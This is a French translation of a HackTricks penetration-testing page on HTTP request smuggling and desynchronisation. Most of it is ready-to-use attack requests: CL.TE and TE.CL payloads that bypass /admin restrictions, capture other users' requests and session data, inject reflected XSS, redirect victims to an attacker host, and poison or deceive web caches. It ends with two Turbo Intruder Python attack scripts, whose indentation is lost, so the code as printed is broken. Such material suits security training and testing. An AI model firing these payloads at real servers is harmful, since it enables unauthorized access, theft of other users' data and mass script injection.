# Attaque de Demande HTTP Smuggling / D√©synchronisation HTTP

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (Expert en √©quipe rouge AWS de HackTricks)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks :

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop) !
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez le** üí¨ [**groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** moi sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) d√©p√¥ts GitHub.

</details>

## Qu'est-ce que c'est

Cette vuln√©rabilit√© se produit lorsqu'une **d√©synchronisation** entre les **proxys frontaux** et le **serveur back-end** permet √† un **attaquant** d'**envoyer** une **demande HTTP** qui sera **interpr√©t√©e** comme une **seule demande** par les **proxys frontaux** (√©quilibrage de charge/proxy inverse) et **comme 2 demandes** par le **serveur back-end**.\
Cela permet √† un utilisateur de **modifier la prochaine demande qui arrive au serveur back-end apr√®s la sienne**.

### Th√©orie

[**Sp√©cification RFC (2161)**](https://tools.ietf.org/html/rfc2616)

> Si un message est re√ßu avec √† la fois un champ d'en-t√™te Transfer-Encoding et un champ d'en-t√™te Content-Length, ce dernier DOIT √™tre ignor√©.

**Content-Length**

> L'en-t√™te d'entit√© Content-Length indique la taille du corps de l'entit√©, en octets, envoy√© au destinataire.

**Transfer-Encoding: chunked**

> L'en-t√™te Transfer-Encoding sp√©cifie la forme de codage utilis√©e pour transf√©rer en toute s√©curit√© le corps de la charge utile √† l'utilisateur.\
> Chunked signifie que de grandes donn√©es sont envoy√©es sous forme de s√©ries de morceaux.

### R√©alit√©

Le **Front-End** (un √©quilibreur de charge / Proxy Inverse) **traite** l'en-t√™te _**content-length**_ ou l'en-t√™te _**transfer-encoding**_ et le **serveur Back-End** **traite l'autre** provoquant une **d√©synchronisation** entre les 2 syst√®mes.\
Cela pourrait √™tre tr√®s critique car **un attaquant pourra envoyer une demande** au proxy inverse qui sera **interpr√©t√©e** par le **serveur back-end comme 2 demandes diff√©rentes**. Le **danger** de cette technique r√©side dans le fait que le **serveur back-end interpr√©tera la 2√®me demande inject√©e** comme si elle **venait du prochain client** et la **vraie demande** de ce client fera **partie** de la **demande inject√©e**.

### Particularit√©s

Rappelez-vous qu'en HTTP **un caract√®re de nouvelle ligne est compos√© de 2 octets :**

* **Content-Length** : Cet en-t√™te utilise un **nombre d√©cimal** pour indiquer le **nombre d'octets** du **corps** de la demande. Le corps est cens√© se terminer par le dernier caract√®re, **une nouvelle ligne n'est pas n√©cessaire √† la fin de la demande**.
* **Transfer-Encoding** : Cet en-t√™te utilise dans le **corps** un **nombre hexad√©cimal** pour indiquer le **nombre d'octets** du **prochain morceau**. Le **morceau** doit se **terminer** par une **nouvelle ligne** mais cette nouvelle ligne **n'est pas compt√©e** par l'indicateur de longueur. Cette m√©thode de transfert doit se terminer par un **morceau de taille 0 suivi de 2 nouvelles lignes** : `0`
* **Connection** : D'apr√®s mon exp√©rience, il est recommand√© d'utiliser **`Connection: keep-alive`** sur la premi√®re demande de la demande de Smuggling.

## Exemples de Base

Les attaques de demande HTTP smuggling sont √©labor√©es en envoyant des demandes ambigu√´s qui exploitent les divergences dans la fa√ßon dont les serveurs frontaux et back-end interpr√®tent les en-t√™tes `Content-Length` (CL) et `Transfer-Encoding` (TE). Ces attaques peuvent se manifester sous diff√©rentes formes, principalement sous forme de **CL.TE**, **TE.CL** et **TE.TE**. Chaque type repr√©sente une combinaison unique de la priorisation de ces en-t√™tes par les serveurs frontaux et back-end. Les vuln√©rabilit√©s d√©coulent du traitement de la m√™me demande par les serveurs de diff√©rentes mani√®res, entra√Ænant des r√©sultats inattendus et potentiellement malveillants.

### Exemples de Types de Vuln√©rabilit√©s de Base

![https://twitter.com/SpiderSec/status/1200413390339887104?ref\_src=twsrc%5Etfw%7Ctwcamp%5Etweetembed%7Ctwterm%5E1200413390339887104\&ref\_url=https%3A%2F%2Ftwitter.com%2FSpiderSec%2Fstatus%2F1200413390339887104](../../.gitbook/assets/EKi5edAUUAAIPIK.jpg)

#### Vuln√©rabilit√© CL.TE (Content-Length utilis√© par le Front-End, Transfer-Encoding utilis√© par le Back-End)
- **Front-End (CL) :** Traite la demande en fonction de l'en-t√™te `Content-Length`.
- **Back-End (TE) :** Traite la demande en fonction de l'en-t√™te `Transfer-Encoding`.
- **Sc√©nario d'attaque :**
- L'attaquant envoie une demande o√π la valeur de l'en-t√™te `Content-Length` ne correspond pas √† la longueur r√©elle du contenu.
- Le serveur front-end transmet la demande enti√®re au back-end, en fonction de la valeur de `Content-Length`.
- Le serveur back-end traite la demande par morceaux en raison de l'en-t√™te `Transfer-Encoding: chunked`, interpr√©tant les donn√©es restantes comme une demande s√©par√©e et ult√©rieure.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 30
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /404 HTTP/1.1
Foo: x
```

#### Vuln√©rabilit√© TE.CL (Transfer-Encoding utilis√© par le Front-End, Content-Length utilis√© par le Back-End)
- **Front-End (TE) :** Traite la demande en fonction de l'en-t√™te `Transfer-Encoding`.
- **Back-End (CL) :** Traite la demande en fonction de l'en-t√™te `Content-Length`.
- **Sc√©nario d'attaque :**
- L'attaquant envoie une demande fragment√©e o√π la taille du fragment (`7b`) et la longueur r√©elle du contenu (`Content-Length: 4`) ne correspondent pas.
- Le serveur front-end, respectant `Transfer-Encoding`, transmet la demande enti√®re au back-end.
- Le serveur back-end, respectant `Content-Length`, traite uniquement la partie initiale de la demande (`7b` octets), laissant le reste comme partie d'une demande ult√©rieure non intentionnelle.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 4
Connection: keep-alive
Transfer-Encoding: chunked

7b
GET /404 HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 30

x=
0

```

#### Vuln√©rabilit√© TE.TE (Transfer-Encoding utilis√© par les deux, avec obfuscation)
- **Serveurs :** Les deux prennent en charge `Transfer-Encoding`, mais l'un peut √™tre tromp√© pour l'ignorer via l'obfuscation.
- **Sc√©nario d'attaque :**
- L'attaquant envoie une demande avec des en-t√™tes `Transfer-Encoding` obfusqu√©s.
- Selon le serveur (front-end ou back-end) qui ne parvient pas √† reconna√Ætre l'obfuscation, une vuln√©rabilit√© CL.TE ou TE.CL peut √™tre exploit√©e.
- La partie non trait√©e de la demande, telle que vue par l'un des serveurs, devient une partie d'une demande ult√©rieure, conduisant √† un smuggling.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: xchunked
Transfer-Encoding : chunked
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding: chunked
Transfer-Encoding: x
Transfer-Encoding:[tab]chunked
[space]Transfer-Encoding: chunked
X: X[\n]Transfer-Encoding: chunked

Transfer-Encoding
: chunked
```

#### **Sc√©nario CL.CL (Content-Length utilis√© par les deux Front-End et Back-End) :**
- Les deux serveurs traitent la demande uniquement en fonction de l'en-t√™te `Content-Length`.
- Ce sc√©nario ne conduit g√©n√©ralement pas √† un smuggling, car il y a une concordance dans la fa√ßon dont les deux serveurs interpr√®tent la longueur de la demande.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Demande normale
```

#### **Sc√©nario CL != 0 :**
- Fait r√©f√©rence aux sc√©narios o√π l'en-t√™te `Content-Length` est pr√©sent et a une valeur autre que z√©ro, indiquant que le corps de la demande contient du contenu.
- Il est crucial pour comprendre et √©laborer des attaques de smuggling, car il influence la fa√ßon dont les serveurs d√©terminent la fin d'une demande.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 16
Connection: keep-alive

Corps non vide
```

#### Forcer via les en-t√™tes hop-by-hop

En abusant des en-t√™tes hop-by-hop, vous pourriez indiquer au proxy de **supprimer l'en-t√™te Content-Length ou Transfer-Encoding pour permettre un abus de demande HTTP smuggling**.
```
Connection: Content-Length
```
Pour **plus d'informations sur les en-t√™tes hop-by-hop**, visitez :

{% content-ref url="../abusing-hop-by-hop-headers.md" %}
[abusing-hop-by-hop-headers.md](../abusing-hop-by-hop-headers.md)
{% endcontent-ref %}


## Identification de la faille de requ√™te HTTP Smuggling

L'identification des vuln√©rabilit√©s de requ√™te HTTP smuggling peut souvent √™tre r√©alis√©e en utilisant des techniques de synchronisation, qui reposent sur l'observation du temps n√©cessaire au serveur pour r√©pondre aux requ√™tes manipul√©es. Ces techniques sont particuli√®rement utiles pour d√©tecter les vuln√©rabilit√©s CL.TE et TE.CL. Outre ces m√©thodes, il existe d'autres strat√©gies et outils qui peuvent √™tre utilis√©s pour trouver de telles vuln√©rabilit√©s :

### Recherche de vuln√©rabilit√©s CL.TE en utilisant des techniques de synchronisation
- **M√©thode :**
- Envoyer une requ√™te qui, si l'application est vuln√©rable, am√®nera le serveur back-end √† attendre des donn√©es suppl√©mentaires.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 4

1
A
0
```
- **Observation :**
- Le serveur frontal traite la requ√™te en fonction de `Content-Length` et coupe le message pr√©matur√©ment.
- Le serveur back-end, s'attendant √† un message chunked, attend le prochain chunk qui n'arrive jamais, provoquant un retard.

- **Indicateurs :**
- D√©lais d'attente ou longs retards dans la r√©ponse.
- R√©ception d'une erreur 400 Bad Request du serveur back-end, parfois avec des informations d√©taill√©es sur le serveur.

### Recherche de vuln√©rabilit√©s TE.CL en utilisant des techniques de synchronisation
- **M√©thode :**
- Envoyer une requ√™te qui, si l'application est vuln√©rable, am√®nera le serveur back-end √† attendre des donn√©es suppl√©mentaires.
- **Exemple :**
```
POST / HTTP/1.1
Host: vulnerable-website.com
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 6

0
X
```
- **Observation :**
- Le serveur frontal traite la requ√™te en fonction de `Transfer-Encoding` et transmet l'int√©gralit√© du message.
- Le serveur back-end, s'attendant √† un message bas√© sur `Content-Length`, attend des donn√©es suppl√©mentaires qui n'arrivent jamais, provoquant un retard.

### Autres m√©thodes pour trouver des vuln√©rabilit√©s
- **Analyse de r√©ponse diff√©rentielle :**
- Envoyer des versions l√©g√®rement vari√©es d'une requ√™te et observer si les r√©ponses du serveur diff√®rent de mani√®re inattendue, indiquant une divergence d'analyse.

- **Utilisation d'outils automatis√©s :**
- Des outils comme l'extension 'HTTP Request Smuggler' de Burp Suite peuvent tester automatiquement ces vuln√©rabilit√©s en envoyant diverses formes de requ√™tes ambigu√´s et en analysant les r√©ponses.

- **Tests de variance de Content-Length :**
- Envoyer des requ√™tes avec des valeurs de `Content-Length` variables qui ne correspondent pas √† la longueur r√©elle du contenu et observer comment le serveur g√®re de telles incoh√©rences.

- **Tests de variance de Transfer-Encoding :**
- Envoyer des requ√™tes avec des en-t√™tes `Transfer-Encoding` obfusqu√©s ou malform√©s et surveiller comment les serveurs frontal et back-end r√©agissent diff√©remment √† de telles manipulations.


### Test de vuln√©rabilit√© de la requ√™te HTTP Smuggling

Apr√®s avoir confirm√© l'efficacit√© des techniques de synchronisation, il est crucial de v√©rifier si les requ√™tes des clients peuvent √™tre manipul√©es. Une m√©thode simple consiste √† tenter de falsifier vos requ√™tes, par exemple, faire en sorte qu'une requ√™te vers `/` renvoie une r√©ponse 404. Les exemples `CL.TE` et `TE.CL` discut√©s pr√©c√©demment dans [Exemples de base](./#basic-examples) montrent comment falsifier une requ√™te client pour obtenir une r√©ponse 404, malgr√© le fait que le client cherche √† acc√©der √† une ressource diff√©rente.

**Consid√©rations cl√©s**

Lors du test des vuln√©rabilit√©s de la requ√™te smuggling en interf√©rant avec d'autres requ√™tes, gardez √† l'esprit :

* **Connexions r√©seau distinctes :** Les requ√™tes "d'attaque" et "normales" doivent √™tre envoy√©es sur des connexions r√©seau distinctes. Utiliser la m√™me connexion pour les deux ne valide pas la pr√©sence de la vuln√©rabilit√©.
* **URL et param√®tres coh√©rents :** Essayez d'utiliser des URL et des noms de param√®tres identiques pour les deux requ√™tes. Les applications modernes routent souvent les requ√™tes vers des serveurs back-end sp√©cifiques en fonction de l'URL et des param√®tres. En les faisant correspondre, vous augmentez la probabilit√© que les deux requ√™tes soient trait√©es par le m√™me serveur, une condition pr√©alable √† une attaque r√©ussie.
* **Synchronisation et conditions de course :** La requ√™te "normale", destin√©e √† d√©tecter l'interf√©rence de la requ√™te "d'attaque", entre en concurrence avec d'autres requ√™tes d'application concurrentes. Par cons√©quent, envoyez la requ√™te "normale" imm√©diatement apr√®s la requ√™te "d'attaque". Les applications charg√©es peuvent n√©cessiter plusieurs essais pour confirmer de mani√®re concluante la vuln√©rabilit√©.
* **D√©fis de l'√©quilibrage de charge :** Les serveurs frontal agissant comme √©quilibreurs de charge peuvent distribuer les requ√™tes sur divers syst√®mes back-end. Si les requ√™tes "d'attaque" et "normales" se retrouvent sur des syst√®mes diff√©rents, l'attaque √©chouera. Cet aspect de l'√©quilibrage de charge peut n√©cessiter plusieurs tentatives pour confirmer une vuln√©rabilit√©.
* **Impact utilisateur non intentionnel :** Si votre attaque affecte involontairement une autre requ√™te utilisateur (pas la requ√™te "normale" que vous avez envoy√©e pour la d√©tection), cela indique que votre attaque a influenc√© un autre utilisateur de l'application. Des tests continus pourraient perturber d'autres utilisateurs, exigeant une approche prudente.


## Abus de la requ√™te HTTP Smuggling

### Contourner les contr√¥les de s√©curit√© frontal

### Contournement de la s√©curit√© frontale via la requ√™te HTTP Smuggling

Parfois, les proxies frontal imposent des mesures de s√©curit√©, scrutant les requ√™tes entrantes. Cependant, ces mesures peuvent √™tre contourn√©es en exploitant la requ√™te HTTP Smuggling, permettant un acc√®s non autoris√© aux points de terminaison restreints. Par exemple, l'acc√®s √† `/admin` peut √™tre interdit de l'ext√©rieur, le proxy frontal bloquant activement de telles tentatives. N√©anmoins, ce proxy peut n√©gliger d'inspecter les requ√™tes int√©gr√©es dans une requ√™te HTTP smuggl√©e, laissant une faille pour contourner ces restrictions.

Consid√©rez les exemples suivants illustrant comment la requ√™te HTTP Smuggling peut √™tre utilis√©e pour contourner les contr√¥les de s√©curit√© frontal, ciblant sp√©cifiquement le chemin `/admin` qui est g√©n√©ralement prot√©g√© par le proxy frontal :

**Exemple CL.TE**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 67
Transfer-Encoding: chunked

0
GET /admin HTTP/1.1
Host: localhost
Content-Length: 10

x=
```
Dans l'attaque CL.TE, l'en-t√™te `Content-Length` est utilis√© pour la requ√™te initiale, tandis que la requ√™te int√©gr√©e ult√©rieure utilise l'en-t√™te `Transfer-Encoding: chunked`. Le proxy frontal traite la requ√™te `POST` initiale mais ne parvient pas √† inspecter la requ√™te `GET /admin` int√©gr√©e, permettant un acc√®s non autoris√© au chemin `/admin`.

**Exemple TE.CL**
```
POST / HTTP/1.1
Host: [redacted].web-security-academy.net
Cookie: session=[redacted]
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 4
Transfer-Encoding: chunked
2b
GET /admin HTTP/1.1
Host: localhost
a=x
0

```
Inversement, dans l'attaque TE.CL, la requ√™te `POST` initiale utilise `Transfer-Encoding: chunked`, et la requ√™te imbriqu√©e ult√©rieure est trait√©e en fonction de l'en-t√™te `Content-Length`. Similaire √† l'attaque CL.TE, le proxy frontal ignore la requ√™te `GET /admin` dissimul√©e, accordant involontairement l'acc√®s au chemin `/admin` restreint.

### R√©v√©ler la r√©√©criture de requ√™te frontale <a href="#revealing-front-end-request-rewriting" id="revealing-front-end-request-rewriting"></a>

Les applications utilisent souvent un **serveur frontal** pour modifier les requ√™tes entrantes avant de les transmettre au serveur back-end. Une modification typique implique l'ajout d'en-t√™tes, tels que `X-Forwarded-For: <IP du client>`, pour transmettre l'IP du client au back-end. Comprendre ces modifications peut √™tre crucial, car cela pourrait r√©v√©ler des moyens de **contourner les protections** ou de **d√©couvrir des informations ou des points de terminaison dissimul√©s**.

Pour enqu√™ter sur la mani√®re dont un proxy modifie une requ√™te, localisez un param√®tre POST que le back-end renvoie dans la r√©ponse. Ensuite, cr√©ez une requ√™te, en utilisant ce param√®tre en dernier, similaire √† ce qui suit:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 130
Connection: keep-alive
Transfer-Encoding: chunked

0

POST /search HTTP/1.1
Host: vulnerable-website.com
Content-Type: application/x-www-form-urlencoded
Content-Length: 100

search=
```
Dans cette structure, les composants de requ√™te suivants sont ajout√©s apr√®s `search=`, qui est le param√®tre refl√©t√© dans la r√©ponse. Cette r√©flexion exposera les en-t√™tes de la requ√™te suivante.

Il est important d'aligner l'en-t√™te `Content-Length` de la requ√™te imbriqu√©e avec la longueur r√©elle du contenu. Il est conseill√© de commencer par une petite valeur et d'augmenter progressivement, car une valeur trop basse tronquera les donn√©es refl√©t√©es, tandis qu'une valeur trop √©lev√©e peut provoquer une erreur de requ√™te.

Cette technique est √©galement applicable dans le contexte d'une vuln√©rabilit√© TE.CL, mais la requ√™te doit se terminer par `search=\r\n0`. Peu importe les caract√®res de saut de ligne, les valeurs seront ajout√©es au param√®tre de recherche.

Cette m√©thode sert principalement √† comprendre les modifications de requ√™te effectu√©es par le proxy frontal, r√©alisant essentiellement une enqu√™te auto-dirig√©e.

### Capture des requ√™tes d'autres utilisateurs <a href="#capturing-other-users-requests" id="capturing-other-users-requests"></a>

Il est possible de capturer les requ√™tes de l'utilisateur suivant en ajoutant une requ√™te sp√©cifique en tant que valeur d'un param√®tre lors d'une op√©ration POST. Voici comment cela peut √™tre accompli :

En ajoutant la requ√™te suivante en tant que valeur d'un param√®tre, vous pouvez enregistrer la requ√™te du client suivant :
```
POST / HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 319
Connection: keep-alive
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi
Transfer-Encoding: chunked

0

POST /post/comment HTTP/1.1
Host: ac031feb1eca352f8012bbe900fa00a1.web-security-academy.net
Content-Length: 659
Content-Type: application/x-www-form-urlencoded
Cookie: session=4X6SWQeR8KiOPZPF2Gpca2IKeA1v4KYi

csrf=gpGAVAbj7pKq7VfFh45CAICeFCnancCM&postId=4&name=asdfghjklo&email=email%40email.com&comment=
```
Dans ce sc√©nario, le **param√®tre de commentaire** est destin√© √† stocker le contenu dans la section commentaire d'un article sur une page publiquement accessible. Par cons√©quent, le contenu de la requ√™te suivante appara√Ætra comme un commentaire.

Cependant, cette technique pr√©sente des limitations. En g√©n√©ral, elle ne capture que les donn√©es jusqu'au d√©limiteur de param√®tre utilis√© dans la requ√™te trafiqu√©e. Pour les soumissions de formulaires encod√©es en URL, ce d√©limiteur est le caract√®re `&`. Cela signifie que le contenu captur√© de la requ√™te de l'utilisateur victime s'arr√™tera au premier `&`, qui peut m√™me faire partie de la cha√Æne de requ√™te.

De plus, il convient de noter que cette approche est √©galement viable avec une vuln√©rabilit√© TE.CL. Dans de tels cas, la requ√™te devrait se terminer par `search=\r\n0`. Peu importe les caract√®res de nouvelle ligne, les valeurs seront ajout√©es au param√®tre de recherche.

### Utilisation du trafic de requ√™tes HTTP pour exploiter les XSS r√©fl√©chis

Le trafic de requ√™tes HTTP peut √™tre utilis√© pour exploiter les pages web vuln√©rables aux **XSS r√©fl√©chis**, offrant des avantages significatifs :

* L'interaction avec les utilisateurs cibles n'est **pas n√©cessaire**.
* Permet l'exploitation de XSS dans des parties de la requ√™te normalement **inaccessibles**, comme les en-t√™tes de requ√™te HTTP.

Dans les sc√©narios o√π un site web est vuln√©rable aux XSS r√©fl√©chis via l'en-t√™te User-Agent, la charge utile suivante d√©montre comment exploiter cette vuln√©rabilit√© :
```
POST / HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:75.0) Gecko/20100101 Firefox/75.0
Cookie: session=ac311fa41f0aa1e880b0594d008d009e
Transfer-Encoding: chunked
Connection: keep-alive
Content-Length: 213
Content-Type: application/x-www-form-urlencoded

0

GET /post?postId=2 HTTP/1.1
Host: ac311fa41f0aa1e880b0594d008d009e.web-security-academy.net
User-Agent: "><script>alert(1)</script>
Content-Length: 10
Content-Type: application/x-www-form-urlencoded

A=
```
Ce payload est structur√© pour exploiter la vuln√©rabilit√© en :

1. Initiating une requ√™te `POST`, apparemment typique, avec un en-t√™te `Transfer-Encoding: chunked` pour indiquer le d√©but du smuggling.
2. Encha√Ænant avec un `0`, marquant la fin du corps du message chunked.
3. Ensuite, une requ√™te `GET` smuggl√©e est introduite, o√π l'en-t√™te `User-Agent` est inject√© avec un script, `<script>alert(1)</script>`, d√©clenchant le XSS lorsque le serveur traite cette requ√™te ult√©rieure.

En manipulant l'en-t√™te `User-Agent` via le smuggling, le payload contourne les contraintes normales de la requ√™te, exploitant ainsi la vuln√©rabilit√© XSS r√©fl√©chie d'une mani√®re non standard mais efficace.

### Utilisation du smuggling de requ√™te HTTP pour transformer une redirection sur site en une redirection ouverte <a href="#using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect" id="using-http-request-smuggling-to-turn-an-on-site-redirect-into-an-open-redirect"></a>

### Exploitation des redirections sur site avec le smuggling de requ√™te HTTP <a href="#exploiting-on-site-redirects-with-http-request-smuggling" id="exploiting-on-site-redirects-with-http-request-smuggling"></a>

Les applications redirigent souvent d'une URL √† une autre en utilisant le nom d'h√¥te de l'en-t√™te `Host` dans l'URL de redirection. C'est courant avec des serveurs web comme Apache et IIS. Par exemple, demander un dossier sans barre oblique finale entra√Æne une redirection pour inclure la barre oblique :
```
GET /home HTTP/1.1
Host: normal-website.com
```
R√©sultats :
```
HTTP/1.1 301 Moved Permanently
Location: https://normal-website.com/home/
```
Bien que semblant inoffensif, ce comportement peut √™tre manipul√© en utilisant le trafic HTTP pour rediriger les utilisateurs vers un site externe. Par exemple:
```
POST / HTTP/1.1
Host: vulnerable-website.com
Content-Length: 54
Connection: keep-alive
Transfer-Encoding: chunked

0

GET /home HTTP/1.1
Host: attacker-website.com
Foo: X
```
Cette requ√™te dissimul√©e pourrait entra√Æner la redirection de la prochaine requ√™te utilisateur trait√©e vers un site web contr√¥l√© par un attaquant :
```
GET /home HTTP/1.1
Host: attacker-website.com
Foo: XGET /scripts/include.js HTTP/1.1
Host: vulnerable-website.com
```
R√©sultats en :
```
HTTP/1.1 301 Moved Permanently
Location: https://attacker-website.com/home/
```
### Utilisation du d√©tournement de requ√™te HTTP pour effectuer un empoisonnement de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-poisoning" id="using-http-request-smuggling-to-perform-web-cache-poisoning"></a>

### Exploitation de l'empoisonnement de cache web via le d√©tournement de requ√™te HTTP <a href="#exploiting-web-cache-poisoning-via-http-request-smuggling" id="exploiting-web-cache-poisoning-via-http-request-smuggling"></a>

L'empoisonnement de cache web peut √™tre ex√©cut√© si un composant de l'**infrastructure frontale met en cache le contenu**, g√©n√©ralement pour am√©liorer les performances. En manipulant la r√©ponse du serveur, il est possible de **empoisonner le cache**.

Pr√©c√©demment, nous avons observ√© comment les r√©ponses du serveur pouvaient √™tre modifi√©es pour renvoyer une erreur 404 (voir [Exemples de base](./#basic-examples)). De la m√™me mani√®re, il est possible de tromper le serveur pour qu'il renvoie le contenu de `/index.html` en r√©ponse √† une demande de `/static/include.js`. Par cons√©quent, le contenu de `/static/include.js` est remplac√© dans le cache par celui de `/index.html`, rendant `/static/include.js` inaccessible aux utilisateurs, ce qui peut potentiellement entra√Æner un D√©ni de Service (DoS).

Cette technique devient particuli√®rement puissante si une **vuln√©rabilit√© de redirection ouverte** est d√©couverte ou s'il y a une **redirection sur site vers une redirection ouverte**. Ces vuln√©rabilit√©s peuvent √™tre exploit√©es pour remplacer le contenu mis en cache de `/static/include.js` par un script sous le contr√¥le de l'attaquant, permettant essentiellement une attaque g√©n√©ralis√©e de Cross-Site Scripting (XSS) contre tous les clients demandant le `/static/include.js` mis √† jour.

Voici une illustration de l'exploitation de **l'empoisonnement de cache combin√© √† une redirection sur site vers une redirection ouverte**. L'objectif est de modifier le contenu mis en cache de `/static/include.js` pour servir du code JavaScript contr√¥l√© par l'attaquant:
```
POST / HTTP/1.1
Host: vulnerable.net
Content-Type: application/x-www-form-urlencoded
Connection: keep-alive
Content-Length: 124
Transfer-Encoding: chunked

0

GET /post/next?postId=3 HTTP/1.1
Host: attacker.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 10

x=1
```
Notez la requ√™te int√©gr√©e ciblant `/post/next?postId=3`. Cette requ√™te sera redirig√©e vers `/post?postId=4`, en utilisant la **valeur de l'en-t√™te Host** pour d√©terminer le domaine. En modifiant l'en-t√™te **Host**, l'attaquant peut rediriger la requ√™te vers son domaine (**redirection sur site vers une redirection ouverte**).

Apr√®s un **empoisonnement de socket** r√©ussi, une requ√™te **GET** pour `/static/include.js` doit √™tre initi√©e. Cette requ√™te sera contamin√©e par la pr√©c√©dente requ√™te de **redirection sur site vers une redirection ouverte** et r√©cup√©rera le contenu du script contr√¥l√© par l'attaquant.

Par la suite, toute requ√™te pour `/static/include.js` servira le contenu mis en cache du script de l'attaquant, lan√ßant ainsi efficacement une vaste attaque XSS.


### Utilisation du d√©tournement de requ√™te HTTP pour effectuer une tromperie de cache web <a href="#using-http-request-smuggling-to-perform-web-cache-deception" id="using-http-request-smuggling-to-perform-web-cache-deception"></a>

> **Quelle est la diff√©rence entre l'empoisonnement de cache web et la tromperie de cache web ?**
>
> * Dans l'**empoisonnement de cache web**, l'attaquant am√®ne l'application √† stocker un contenu malveillant dans le cache, et ce contenu est servi √† partir du cache √† d'autres utilisateurs de l'application.
> * Dans la **tromperie de cache web**, l'attaquant am√®ne l'application √† stocker un contenu sensible appartenant √† un autre utilisateur dans le cache, puis l'attaquant r√©cup√®re ce contenu √† partir du cache.

L'attaquant cr√©e une requ√™te dissimul√©e qui r√©cup√®re un contenu sensible sp√©cifique √† l'utilisateur. Consid√©rez l'exemple suivant:
```markdown
`POST / HTTP/1.1`\
`Host: vulnerable-website.com`\
`Connection: keep-alive`\
`Content-Length: 43`\
`Transfer-Encoding: chunked`\
``\ `0`\``\
`GET /private/messages HTTP/1.1`\
`Foo: X`
```
Si cette requ√™te de contrebande empoisonne une entr√©e de cache destin√©e √† un contenu statique (par exemple, `/someimage.png`), les donn√©es sensibles de la victime provenant de `/private/messages` pourraient √™tre mises en cache sous l'entr√©e de cache du contenu statique. Par cons√©quent, l'attaquant pourrait potentiellement r√©cup√©rer ces donn√©es sensibles mises en cache.

### Armes HTTP Request Smuggling avec la d√©synchronisation des r√©ponses HTTP

Avez-vous trouv√© une vuln√©rabilit√© de Smuggling de requ√™tes HTTP et vous ne savez pas comment l'exploiter ? Essayez cette autre m√©thode d'exploitation :

{% content-ref url="../http-response-smuggling-desync.md" %}
[http-response-smuggling-desync.md](../http-response-smuggling-desync.md)
{% endcontent-ref %}

## Scripts Turbo Intruder

### CL.TE

Depuis [https://hipotermia.pw/bb/http-desync-idor](https://hipotermia.pw/bb/http-desync-idor)
```python
def queueRequests(target, wordlists):

engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Transfer-Encoding: chunked
Host: xxx.com
Content-Length: 35
Foo: bar

0

GET /admin7 HTTP/1.1
X-Foo: k'''

engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)

def handleResponse(req, interesting):
table.add(req)
```
### TE.CL

De : [https://hipotermia.pw/bb/http-desync-account-takeover](https://hipotermia.pw/bb/http-desync-account-takeover)
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint,
concurrentConnections=5,
requestsPerConnection=1,
resumeSSL=False,
timeout=10,
pipeline=False,
maxRetriesPerRequest=0,
engine=Engine.THREADED,
)
engine.start()

attack = '''POST / HTTP/1.1
Host: xxx.com
Content-Length: 4
Transfer-Encoding : chunked

46
POST /nothing HTTP/1.1
Host: xxx.com
Content-Length: 15

kk
0

'''
engine.queue(attack)

victim = '''GET / HTTP/1.1
Host: xxx.com

'''
for i in range(14):
engine.queue(victim)
time.sleep(0.05)


def handleResponse(req, interesting):
table.add(req)
```
## Outils

* [https://github.com/anshumanpattnaik/http-request-smuggling](https://github.com/anshumanpattnaik/http-request-smuggling)
* [https://github.com/PortSwigger/http-request-smuggler](https://github.com/PortSwigger/http-request-smuggler)
* [https://github.com/gwen001/pentest-tools/blob/master/smuggler.py](https://github.com/gwen001/pentest-tools/blob/master/smuggler.py)
* [https://github.com/defparam/smuggler](https://github.com/defparam/smuggler)
